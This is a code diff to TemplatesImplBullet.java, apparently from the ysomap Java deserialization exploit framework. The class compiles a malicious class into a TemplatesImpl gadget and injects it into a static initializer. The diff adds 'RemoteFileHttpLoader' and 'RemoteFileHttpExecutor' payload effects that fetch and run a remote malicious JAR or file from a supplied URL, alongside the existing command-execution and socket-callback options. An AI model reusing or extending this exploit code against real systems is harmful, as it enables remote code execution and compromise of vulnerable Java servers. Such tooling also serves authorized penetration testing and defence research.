@@ -10,6 +10,8 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
 import javassist.*;
+import loader.RemoteFileHttpExecutor;
+import loader.RemoteFileHttpLoader;
 import loader.RemoteFileLoader;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
@@ -22,6 +24,11 @@ import java.io.Serializable;
 import java.util.UUID;
 
 /**
+ * 编译恶意类，并填充到TemplatesImpl
+ * 共有以下选择
+ * 1. 命令执行
+ *    set type cmd
+ *
  * @author wh1t3P1g
  * @since 2020/2/17
  */
@@ -42,7 +49,7 @@ public class TemplatesImplBullet implements Bullet<Object> {
                                 "1. cmd，body写入具体的系统命令；\n" +
                                 "2. code, body写入具体需要插入执行的代码；\n" +
                                 "3. socket, body写入`ip:port`\n" +
-                                "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname`")
+                                "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`")
     private String type = "cmd";
 
     @NotNull
@@ -50,7 +57,8 @@ public class TemplatesImplBullet implements Bullet<Object> {
     private String body = "";
 
     @NotNull
-    @Require(name = "effect", type = "string", detail="选择载入payload的效果，可选default、TomcatEcho、SocketEcho、Loader")
+    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
+                                                      "可选default、TomcatEcho、SocketEcho、RemoteFileLoader、RemoteFileHttpLoader、RemoteFileHttpExecutor")
     private String effect = "default";
 
     @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
@@ -88,39 +96,51 @@ public class TemplatesImplBullet implements Bullet<Object> {
     private byte[] makeEvilByteCode(String body) throws NotFoundException, CannotCompileException, IOException {
         ClassPool pool = new ClassPool(true);
         CtClass cc = null;
+        String code = null;
+
         if("default".equals(effect)){
             cc = ClassFiles.makeClassFromExistClass(pool,
                     StubTransletPayload.class,
                     new Class<?>[]{abstractTranslet}
             );
-            ClassFiles.insertStaticBlock(cc, body);
-            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
+            code = body;
         }else if("TomcatEcho".equals(effect)){
             cc = ClassFiles.makeClassFromExistClass(pool,
                     TomcatEchoPayload.class,
                     new Class<?>[]{abstractTranslet}
             );
             cc.setName("TomcatEcho"+System.currentTimeMillis());
-            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
         }else if("SocketEcho".equals(effect)){
             String[] remote = body.split(":");
-            String code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
+            code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
             pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
             cc = pool.getCtClass(SocketEchoPayload.class.getName());
             cc.setName("SocketEcho"+System.currentTimeMillis());
-            ClassFiles.insertStaticBlock(cc, code);
-            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
-        }else if("Loader".equals(effect)){
+        }else if("RemoteFileLoader".equals(effect)){
             String[] remote = body.split(";");
-            String code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
+            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
             pool.appendClassPath(new ClassClassPath(RemoteFileLoader.class));
             cc = pool.getCtClass(RemoteFileLoader.class.getName());
             cc.setName("Loader"+System.currentTimeMillis());
-            ClassFiles.insertStaticBlock(cc, code);
-            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
+        }else if("RemoteFileHttpLoader".equals(effect)){
+            String[] remote = body.split(";");
+            code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
+            pool.appendClassPath(new ClassClassPath(RemoteFileHttpLoader.class));
+            cc = pool.getCtClass(RemoteFileHttpLoader.class.getName());
+            cc.setName("Loader"+System.currentTimeMillis());
+        }else if("RemoteFileHttpExecutor".equals(effect)){
+            String[] remote = body.split(";");
+            code = "url=\""+remote[0]+"\";\nos=\""+remote[1]+"\";";
+            pool.appendClassPath(new ClassClassPath(RemoteFileHttpExecutor.class));
+            cc = pool.getCtClass(RemoteFileHttpExecutor.class.getName());
+            cc.setName("Loader"+System.currentTimeMillis());
         }
 
         if(cc != null){
+            if(code != null){
+                ClassFiles.insertStaticBlock(cc, code);
+            }
+            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
             return cc.toBytecode();
         }else{
             return new byte[0];
